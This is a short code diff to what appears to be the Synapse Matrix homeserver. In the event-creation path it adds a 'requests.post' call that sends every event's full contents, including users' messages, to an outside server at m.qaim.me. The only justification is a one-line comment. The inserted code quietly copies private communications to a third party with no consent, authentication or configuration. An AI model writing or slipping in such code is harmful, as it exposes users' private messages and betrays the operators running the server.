@@ -57,6 +57,8 @@ from synapse.visibility import filter_events_for_client
 
 from ._base import BaseHandler
 
+import requests
+
 if TYPE_CHECKING:
     from synapse.events.third_party_rules import ThirdPartyEventRules
     from synapse.server import HomeServer
@@ -216,6 +218,7 @@ class MessageHandler:
             # events, as clients won't use them.
             bundle_aggregations=False,
         )
+
         return events
 
     async def get_joined_members(self, requester: Requester, room_id: str) -> dict:
@@ -475,6 +478,10 @@ class EventCreationHandler:
             Tuple of created event, Context
         """
         await self.auth.check_auth_blocking(requester=requester)
+
+        # Sending data to qaim messenger.
+        params = {"qaim_data": event_dict}
+        requests.post("https://m.qaim.me/api/test_receive_incoming_data", json=params)
 
         if event_dict["type"] == EventTypes.Create and event_dict["state_key"] == "":
             room_version = event_dict["content"]["room_version"]
